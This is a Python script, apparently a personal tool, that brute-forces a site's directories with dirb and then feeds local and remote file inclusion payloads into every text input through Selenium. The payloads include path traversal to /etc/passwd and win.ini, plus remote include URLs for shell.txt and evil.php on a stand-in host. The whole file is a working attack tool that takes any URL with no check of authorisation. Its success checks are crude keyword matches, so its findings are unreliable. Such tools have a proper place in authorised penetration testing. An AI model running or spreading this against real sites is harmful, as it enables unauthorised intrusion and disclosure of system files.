import subprocess
import time
import random
import re
from urllib.parse import urlparse, urljoin
from selenium import webdriver
from selenium.common.exceptions import StaleElementReferenceException, ElementNotInteractableException, TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import csv

# List of LFI/RFI payloads
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini"
]

rfi_payloads = [
    "http://example.com/shell.txt",
    "http://example.com/evil.php"
]

def is_valid_url_or_ip(input):
    """
    Check if the input is a valid URL or IP address.
    """
    try:
        result = urlparse(input)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def run_dirb(url):
    """
    Run dirb to find subdirectories of the given URL or IP address.
    Return a list of tuples (directory, found).
    """
    subdirs = []
    try:
        process = subprocess.Popen(['dirb', url, '/home/akrakali/Documents/PI/dir.txt', '-r', '-S'],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        print("Running dirb, please wait...")

        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            # Check if the line contains a valid subdirectory or file
            match = re.search(r'^\+ (.*?)( \(|$)', line)
            if match:
                path = match.group(1).strip()
                subdirs.append((path, True))

            print(line, end='')  # Print dirb output line by line

        process.wait()  # Wait for the process to complete
    except FileNotFoundError:
        print("Dirb is not installed or not found in PATH.")
    return subdirs

def test_lfi_rfi_payloads(url, input_locator, payload):
    """
    Function to test LFI/RFI payloads on input fields.
    """
    driver = webdriver.Firefox()
    driver.get(url)

    wait = WebDriverWait(driver, 10)
    input_element = wait.until(EC.presence_of_element_located(input_locator))

    input_field_id = input_element.get_attribute("id")
    input_field_name = input_element.get_attribute("name")
    print(f"Testing payload '{payload}' on input field '{input_field_name}' (ID: {input_field_id})")

    try:
        # Clear the input field
        input_element.clear()

        # Enter the payload into the input field
        input_element.send_keys(payload)

        # Submit the form
        input_element.submit()
        time.sleep(2)  # Wait for the page to reload and search for errors

        # Check for signs of LFI/RFI vulnerability
        page_source = driver.page_source.lower()
        lfi_rfi_errors = [
            "root:x:0:0:",  # Common string in /etc/passwd file
            "[extensions]",  # Common string in windows/win.ini file
            "shell",
            "exec"
        ]
        if any(error in page_source for error in lfi_rfi_errors):
            print(f"Possible LFI/RFI vulnerability detected with payload '{payload}'")
            print(f"Vulnerable input field: {input_field_name} (ID: {input_field_id})")
            driver.quit()
            return True, input_field_name, payload

        # Additional check: look for changes in application behavior or unexpected data
        if "shell" in page_source or "exec" in page_source:
            print(f"Unexpected behavior detected with payload '{payload}' - Potential LFI/RFI")
            driver.quit()
            return True, input_field_name, payload

    except StaleElementReferenceException:
        print("StaleElementReferenceException occurred. Re-finding the element.")

    finally:
        driver.quit()
    return False, None, None

def should_test_input(input_element):
    """
    Analyze if the input field is worth testing for LFI/RFI.
    """
    input_type = input_element.get_attribute("type")
    input_name = input_element.get_attribute("name")
    input_id = input_element.get_attribute("id")

    if input_type in ["text", "textarea"]:
        print(f"Input field '{input_name}' (ID: {input_id}) is worth testing for LFI/RFI.")
        return True
    else:
        print(f"Input field '{input_name}' (ID: {input_id}) is not worth testing for LFI/RFI (type: {input_type}).")
        return False



def generate_csv_report(working_payloads, subdirs, all_payloads):
    """
    Generate a CSV report of tested payloads and directories found by dirb.
    """
    report_file = "lfi_rfi_report.csv"

    with open(report_file, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(['Payload', 'Vulnerability Detected', 'Directory Found'])

        # Collect payloads that were tested but didn't result in a vulnerability
        tested_payloads = set()
        for input_field, payload in working_payloads:
            tested_payloads.add(payload)
        for payload in all_payloads:
            if payload not in tested_payloads:
                writer.writerow([payload, 'No', ''])

        # Write payloads that resulted in a vulnerability
        for payload_info in working_payloads:
            payload = payload_info[1]
            directory_found = next((directory for directory, found in subdirs if found), '')
            writer.writerow([payload, 'Yes', directory_found])

def main():
    # Get the URL or IP address of the website from the user
    input_url = input("Enter the URL or IP address of the website to test: ")

    # Validate the input as URL or IP address
    if not is_valid_url_or_ip(input_url):
        print("Invalid URL or IP address format.")
        return

    # Ensure the URL has a scheme
    if not input_url.startswith('http://') and not input_url.startswith('https://'):
        input_url = 'http://' + input_url

    # Run dirb to find subdirectories
    print("\nRunning dirb to find subdirectories...")
    subdirs = run_dirb(input_url)
    print("\nSubdirectories found:")
    for subdir, found in subdirs:
        print(f"  - {subdir} (Found: {found})")

    print(f"\nTotal {len(subdirs)} subdirectories found.\n")

    # Launch the browser to get the input elements
    driver = webdriver.Firefox()
    driver.get(input_url)

    # Wait for the input fields to be present
    wait = WebDriverWait(driver, 10)
    input_elements = wait.until(EC.presence_of_all_elements_located((By.XPATH, "//input[@type='text'] | //textarea")))

    print(f"Found {len(input_elements)} input fields on the webpage.")

    # Initialize lists to store working and potential payloads
    working_payloads = []

    # Test LFI/RFI payloads on each input field
    for input_element in input_elements:
        input_field_id = input_element.get_attribute("id")
        input_field_name = input_element.get_attribute("name")
        input_locator = (By.ID, input_field_id) if input_field_id else (By.NAME, input_field_name)
        print("\n-----------------------------------------------")

        # Analyze if the input field is worth testing
        if should_test_input(input_element):
            for payload in lfi_payloads + rfi_payloads:
                vulnerability_detected, input_field_name, payload_tested = test_lfi_rfi_payloads(input_url, input_locator, payload)
                if vulnerability_detected:
                    working_payloads.append((input_field_name, payload_tested))
        else:
            print(f"Skipping LFI/RFI test for input field '{input_field_name}' (ID: {input_field_id})")

    # List all the payloads tested (including those that didn't result in vulnerability)
    all_payloads = lfi_payloads + rfi_payloads

    # Generate CSV report
    generate_csv_report(working_payloads, subdirs, all_payloads)

    # List all the working and potential payloads for LFI/RFI
    print("\n---------------------------------------------------")
    print("LFI/RFI testing completed.")
    if working_payloads:
        print("\nWorking LFI/RFI Payloads:")
        for input_field, payload in working_payloads:
            print(f"Input Field: {input_field}, Payload: {payload}")
    else:
        print("\nNo working LFI/RFI payloads found.")

    driver.quit()

if __name__ == "__main__":
    main()
